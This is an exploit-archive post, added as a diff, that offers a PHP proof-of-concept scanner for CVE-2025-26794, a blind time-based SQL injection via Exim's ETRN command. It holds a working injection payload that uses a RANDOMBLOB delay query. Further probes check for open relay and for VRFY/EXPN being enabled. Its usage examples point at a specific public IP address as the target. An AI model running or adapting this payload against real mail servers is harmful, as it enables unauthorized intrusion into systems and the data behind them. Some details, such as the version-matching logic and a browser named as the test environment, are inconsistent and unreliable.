@@ -1,0 +1,462 @@
+=============================================================================================================================================
+| # Title     : Exim 4.98 – Blind Time‑Based SQLi via ETRN                                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://www.exim.org/                                                                                                       |
+=============================================================================================================================================
+
+[+] References :  https://packetstorm.news/files/id/211062/ & 	CVE-2025-26794
+
+[+] Summary    : This vulnerability exists in Exim when ETRN input is serialized and passed to a SQLite backend. Time‑based SQL injection allows attackers
+                 to detect conditions in SQL execution measuring response latency.
+
+
+[+] php poc.php
+
+php poc.php 93.190.40.231 --test-only
+
+php poc.php 93.190.40.231 -p 25 --test-only
+
+php poc.php 93.190.40.231 --full-scan
+
+<?php
+/**
+ * CVE-2025-26794: Exim ETRN SQL Injection Vulnerability Scanner
+ */
+
+class Colors {
+    const HEADER = "\033[95m";
+    const OKBLUE = "\033[94m";
+    const OKCYAN = "\033[96m";
+    const OKGREEN = "\033[92m";
+    const WARNING = "\033[93m";
+    const FAIL = "\033[91m";
+    const ENDC = "\033[0m";
+    const BOLD = "\033[1m";
+}
+
+class AdvancedEximScanner {
+    private $host;
+    private $port;
+    private $timeout;
+    private $test_only;
+    
+    public function __construct($host, $port = 25, $timeout = 10, $test_only = false) {
+        $this->host = $this->cleanHost($host);
+        $this->port = (int)$port;
+        $this->timeout = $timeout;
+        $this->test_only = $test_only;
+    }
+    
+    private function cleanHost($host) {
+        // إزالة البروتوكولات والمسارات
+        $host = preg_replace('/^https?:\/\//i', '', $host);
+        $host = preg_replace('/\/.*$/', '', $host);
+        return trim($host);
+    }
+    
+    public function comprehensiveScan() {
+        echo Colors::HEADER . Colors::BOLD . "=== Comprehensive Exim Security Scan ===\n" . Colors::ENDC;
+        echo "Target: {$this->host}:{$this->port}\n";
+        echo "Mode: " . ($this->test_only ? "Test Only" : "Full Scan") . "\n\n";
+        
+        // 1. Get banner and version
+        $this->checkBanner();
+        
+        // 2. Test for CVE-2025-26794
+        if ($this->testCVE202526794()) {
+            echo Colors::FAIL . "[!] CRITICAL: Vulnerable to CVE-2025-26794\n" . Colors::ENDC;
+        } else {
+            echo Colors::OKGREEN . "[+] Not vulnerable to CVE-2025-26794\n" . Colors::ENDC;
+        }
+        
+        if (!$this->test_only) {
+            // 3. Test other common vulnerabilities
+            $this->testCommonVulns();
+            
+            // 4. Check configuration issues
+            $this->checkConfiguration();
+            
+            // 5. Generate report
+            $this->generateReport();
+        }
+    }
+    
+    private function connectSMTP() {
+        $socket = @fsockopen($this->host, $this->port, $errno, $errstr, $this->timeout);
+        if (!$socket) {
+            echo Colors::FAIL . "[!] Connection failed: $errstr ($errno)\n" . Colors::ENDC;
+            return null;
+        }
+        stream_set_timeout($socket, $this->timeout);
+        return $socket;
+    }
+    
+    private function checkBanner() {
+        echo Colors::OKBLUE . "[*] Checking SMTP banner...\n" . Colors::ENDC;
+        
+        $socket = $this->connectSMTP();
+        if (!$socket) return;
+        
+        $banner = fgets($socket, 1024);
+        if ($banner) {
+            $banner = trim($banner);
+            echo Colors::OKGREEN . "[+] Banner: $banner\n" . Colors::ENDC;
+            
+            // Detect Exim
+            if (stripos($banner, 'Exim') !== false) {
+                echo Colors::OKGREEN . "[+] Server identified as Exim\n" . Colors::ENDC;
+                
+                // Extract version
+                if (preg_match('/Exim\s+(\d+\.\d+(?:\.\d+)?)/i', $banner, $matches)) {
+                    $version = $matches[1];
+                    echo Colors::OKGREEN . "[+] Exim version: $version\n" . Colors::ENDC;
+                    $this->checkVersionVulnerabilities($version);
+                }
+            } elseif (stripos($banner, 'Postfix') !== false) {
+                echo Colors::WARNING . "[!] Server is Postfix, not Exim\n" . Colors::ENDC;
+            } elseif (stripos($banner, 'Sendmail') !== false) {
+                echo Colors::WARNING . "[!] Server is Sendmail, not Exim\n" . Colors::ENDC;
+            } elseif (stripos($banner, 'Microsoft') !== false) {
+                echo Colors::WARNING . "[!] Server is Microsoft Exchange\n" . Colors::ENDC;
+            } else {
+                echo Colors::WARNING . "[!] Unknown mail server type\n" . Colors::ENDC;
+            }
+        }
+        
+        fclose($socket);
+    }
+    
+    private function testCVE202526794() {
+        echo Colors::OKBLUE . "\n[*] Testing CVE-2025-26794 (ETRN SQL Injection)...\n" . Colors::ENDC;
+        
+        $normal_times = [];
+        $delayed_times = [];
+        $delay_payload = "SELECT 1 FROM tbl WHERE 1234=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(10000000))))";
+        
+        for ($test = 0; $test < 2; $test++) {
+            $socket = $this->connectSMTP();
+            if (!$socket) return false;
+            
+            // Normal request
+            fwrite($socket, "ETRN #test\r\n");
+            $start = microtime(true);
+            $response = fgets($socket, 1024);
+            $normal_time = microtime(true) - $start;
+            $normal_times[] = $normal_time;
+            
+            fclose($socket);
+            usleep(300000); // 300ms delay
+            
+            // Delayed request
+            $socket = $this->connectSMTP();
+            if (!$socket) return false;
+            
+            $sqli_payload = "#',1); $delay_payload /*";
+            fwrite($socket, "ETRN $sqli_payload\r\n");
+            $start = microtime(true);
+            $response = fgets($socket, 1024);
+            $delayed_time = microtime(true) - $start;
+            $delayed_times[] = $delayed_time;
+            
+            fclose($socket);
+            
+            echo Colors::OKCYAN . "  Test " . ($test + 1) . ": Normal=" . number_format($normal_time, 3) . 
+                 "s, Delayed=" . number_format($delayed_time, 3) . "s\n" . Colors::ENDC;
+            
+            if ($test < 1) usleep(500000); // 500ms between cycles
+        }
+        
+        if (count($normal_times) > 0 && count($delayed_times) > 0) {
+            $avg_normal = array_sum($normal_times) / count($normal_times);
+            $avg_delayed = array_sum($delayed_times) / count($delayed_times);
+            $diff = $avg_delayed - $avg_normal;
+            
+            echo Colors::OKCYAN . "[+] Avg normal: " . number_format($avg_normal, 3) . "s\n" . Colors::ENDC;
+            echo Colors::OKCYAN . "[+] Avg delayed: " . number_format($avg_delayed, 3) . "s\n" . Colors::ENDC;
+            echo Colors::OKCYAN . "[+] Difference: " . number_format($diff, 3) . "s\n" . Colors::ENDC;
+            
+            return $diff > 0.3; // Threshold for vulnerability
+        }
+        
+        return false;
+    }
+    
+    private function testCommonVulns() {
+        echo Colors::OKBLUE . "\n[*] Testing other common vulnerabilities...\n" . Colors::ENDC;
+        
+        $tests = [
+            'Open Relay Test' => [
+                'command' => "MAIL FROM:<test@test.com>\r\nRCPT TO:<external@example.com>\r\n",
+                'vulnerable_if' => '250'
+            ],
+            'VRFY Command Enabled' => [
+                'command' => "VRFY root\r\n",
+                'vulnerable_if' => '250'
+            ],
+            'EXPN Command Enabled' => [
+                'command' => "EXPN admin\r\n",
+                'vulnerable_if' => '250'
+            ]
+        ];
+        
+        foreach ($tests as $test_name => $test) {
+            echo "  - Testing $test_name... ";
+            
+            $socket = $this->connectSMTP();
+            if (!$socket) {
+                echo Colors::WARNING . "Connection failed\n" . Colors::ENDC;
+                continue;
+            }
+            
+            fgets($socket, 1024); // Read banner
+            
+            // Send EHLO first
+            fwrite($socket, "EHLO test.com\r\n");
+            fread($socket, 4096);
+            
+            // Send test command
+            fwrite($socket, $test['command']);
+            $response = fgets($socket, 1024);
+            
+            $is_vulnerable = (strpos($response, $test['vulnerable_if']) === 0);
+            
+            if ($is_vulnerable) {
+                echo Colors::FAIL . "VULNERABLE\n" . Colors::ENDC;
+            } else {
+                echo Colors::OKGREEN . "OK\n" . Colors::ENDC;
+            }
+            
+            fclose($socket);
+            usleep(200000); // 200ms delay
+        }
+    }
+    
+    private function checkConfiguration() {
+        echo Colors::OKBLUE . "\n[*] Checking for common misconfigurations...\n" . Colors::ENDC;
+        
+        $checks = [
+            'TLS/SSL Support' => $this->checkTLS(),
+            'Banner Information' => $this->checkBannerInfo(),
+            'Weak Ciphers' => 'Manual check required',
+            'DNS Records' => $this->checkDNS()
+        ];
+        
+        foreach ($checks as $check => $result) {
+            echo "  - $check: $result\n";
+        }
+    }
+    
+    private function checkTLS() {
+        // Try to connect with SSL
+        $context = stream_context_create([
+            'ssl' => [
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            ]
+        ]);
+        
+        $socket = @stream_socket_client(
+            "ssl://{$this->host}:{$this->port}",
+            $errno,
+            $errstr,
+            $this->timeout,
+            STREAM_CLIENT_CONNECT,
+            $context
+        );
+        
+        if ($socket) {
+            fclose($socket);
+            return Colors::OKGREEN . "Available" . Colors::ENDC;
+        }
+        
+        // Try STARTTLS
+        $socket = $this->connectSMTP();
+        if ($socket) {
+            fgets($socket, 1024); // Banner
+            fwrite($socket, "EHLO test.com\r\n");
+            $response = fread($socket, 4096);
+            fclose($socket);
+            
+            if (strpos($response, 'STARTTLS') !== false) {
+                return Colors::OKGREEN . "Available (STARTTLS)" . Colors::ENDC;
+            }
+        }
+        
+        return Colors::WARNING . "Not available" . Colors::ENDC;
+    }
+    
+    private function checkBannerInfo() {
+        $socket = $this->connectSMTP();
+        if (!$socket) return Colors::WARNING . "Cannot check" . Colors::ENDC;
+        
+        $banner = fgets($socket, 1024);
+        fclose($socket);
+        
+        // Check if banner reveals too much info
+        $info_leak = false;
+        $suspicious = ['internal', 'version', 'debug', 'test', 'dev'];
+        
+        foreach ($suspicious as $word) {
+            if (stripos($banner, $word) !== false) {
+                $info_leak = true;
+                break;
+            }
+        }
+        
+        return $info_leak ? Colors::FAIL . "Information leak" . Colors::ENDC : Colors::OKGREEN . "OK" . Colors::ENDC;
+    }
+    
+    private function checkDNS() {
+        // Check MX records
+        $mx_records = @dns_get_record($this->host, DNS_MX);
+        if ($mx_records) {
+            return Colors::OKGREEN . "MX records found" . Colors::ENDC;
+        }
+        
+        // Check if it's an IP
+        if (filter_var($this->host, FILTER_VALIDATE_IP)) {
+            return Colors::OKCYAN . "Direct IP connection" . Colors::ENDC;
+        }
+        
+        return Colors::WARNING . "No MX records" . Colors::ENDC;
+    }
+    
+    private function checkVersionVulnerabilities($version) {
+        $knownVulns = [
+            '4.94' => ['CVE-2020-28007', 'CVE-2021-27216'],
+            '4.95' => ['CVE-2023-42115', 'CVE-2023-42116'],
+            '4.96' => ['CVE-2024-39929'],
+            '4.97' => ['CVE-2024-45090'],
+            '4.98' => ['CVE-2025-26794']
+        ];
+        
+        foreach ($knownVulns as $ver => $cves) {
+            if (version_compare($version, $ver, '>=')) {
+                echo Colors::WARNING . "[!] May be vulnerable to:\n" . Colors::ENDC;
+                foreach ($cves as $cve) {
+                    echo Colors::WARNING . "    - $cve\n" . Colors::ENDC;
+                }
+                break;
+            }
+        }
+    }
+    
+    public function generateReport() {
+        echo Colors::HEADER . Colors::BOLD . "\n=== SECURITY ASSESSMENT REPORT ===\n" . Colors::ENDC;
+        echo "Date: " . date('Y-m-d H:i:s') . "\n";
+        echo "Target: {$this->host}:{$this->port}\n";
+        echo "Scanner: Exim Security Scanner v1.0\n";
+        echo "\n" . str_repeat("=", 50) . "\n";
+        
+        echo Colors::BOLD . "\nSUMMARY:\n" . Colors::ENDC;
+        echo "• CVE-2025-26794: " . 
+             ($this->testCVE202526794() ? Colors::FAIL . "VULNERABLE" : Colors::OKGREEN . "NOT VULNERABLE") . 
+             Colors::ENDC . "\n";
+        echo "• Server Type: Exim (detected from banner)\n";
+        echo "• TLS Support: " . $this->checkTLS() . "\n";
+        
+        echo Colors::BOLD . "\nRECOMMENDATIONS:\n" . Colors::ENDC;
+        echo "1. Keep Exim updated to latest version\n";
+        echo "2. Disable unused SMTP commands (VRFY, EXPN)\n";
+        echo "3. Enforce TLS encryption\n";
+        echo "4. Implement rate limiting\n";
+        echo "5. Regular security audits\n";
+        echo "6. Monitor logs for suspicious activity\n";
+        
+        echo Colors::BOLD . "\nNEXT STEPS:\n" . Colors::ENDC;
+        echo "• Run full vulnerability scan with nmap\n";
+        echo "• Check for other open ports\n";
+        echo "• Review Exim configuration files\n";
+        echo "• Implement firewall rules\n";
+        
+        echo "\n" . Colors::WARNING . "NOTE: This is a basic scan. Comprehensive testing requires manual review.\n" . Colors::ENDC;
+    }
+}
+
+// Main execution with proper argument parsing
+function main($argv) {
+    echo Colors::HEADER . Colors::BOLD . "
+╔═══════════════════════════════════════════════════════════╗
+║                 Exim Security Scanner                     ║
+║                      by indoushka                         ║
+╚═══════════════════════════════════════════════════════════╝
+" . Colors::ENDC;
+    
+    if (count($argv) < 2) {
+        echo "\nUsage: php " . basename($argv[0]) . " <host> [options]\n";
+        echo "\nOptions:\n";
+        echo "  -p, --port PORT      SMTP port (default: 25)\n";
+        echo "  -t, --timeout SEC    Timeout in seconds (default: 10)\n";
+        echo "  --test-only          Test only CVE-2025-26794\n";
+        echo "  --full-scan          Complete security scan\n";
+        echo "\nExamples:\n";
+        echo "  php " . basename($argv[0]) . " 93.190.40.231 --test-only\n";
+        echo "  php " . basename($argv[0]) . " mail.example.com -p 587 --full-scan\n";
+        exit(1);
+    }
+    
+    $host = $argv[1];
+    $port = 25;
+    $timeout = 10;
+    $test_only = false;
+    $full_scan = false;
+    
+    // Parse arguments
+    for ($i = 2; $i < count($argv); $i++) {
+        if ($argv[$i] === '-p' || $argv[$i] === '--port') {
+            $port = (int)$argv[++$i];
+        } elseif ($argv[$i] === '-t' || $argv[$i] === '--timeout') {
+            $timeout = (int)$argv[++$i];
+        } elseif ($argv[$i] === '--test-only') {
+            $test_only = true;
+        } elseif ($argv[$i] === '--full-scan') {
+            $full_scan = true;
+        }
+    }
+    
+    // If neither specified, default to test-only
+    if (!$test_only && !$full_scan) {
+        $test_only = true;
+    }
+    
+    // Authorization warning
+    echo Colors::WARNING . str_repeat("=", 60) . "\n";
+    echo "AUTHORIZATION REQUIRED\n";
+    echo str_repeat("=", 60) . Colors::ENDC . "\n";
+    echo "Target: $host:$port\n\n";
+    echo Colors::FAIL . "WARNING: Unauthorized testing is illegal.\n" . Colors::ENDC;
+    echo Colors::FAIL . "You MUST have written permission from the system owner.\n\n" . Colors::ENDC;
+    
+    echo Colors::BOLD . "Proceed? (yes/no): " . Colors::ENDC;
+    $response = trim(fgets(STDIN));
+    
+    if (strtolower($response) !== 'yes' && strtolower($response) !== 'y') {
+        echo Colors::FAIL . "\n[!] Authorization not confirmed. Exiting.\n" . Colors::ENDC;
+        exit(0);
+    }
+    
+    echo "\n";
+    
+    // Run scan
+    try {
+        $scanner = new AdvancedEximScanner($host, $port, $timeout, $test_only);
+        $scanner->comprehensiveScan();
+    } catch (Exception $e) {
+        echo Colors::FAIL . "[!] Error: " . $e->getMessage() . "\n" . Colors::ENDC;
+    }
+    
+    echo Colors::OKGREEN . "\n[+] Scan completed.\n" . Colors::ENDC;
+}
+
+// Run only if executed from CLI
+if (PHP_SAPI === 'cli') {
+    main($argv);
+} else {
+    echo "This script must be run from command line.\n";
+    exit(1);
+}
+?>
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
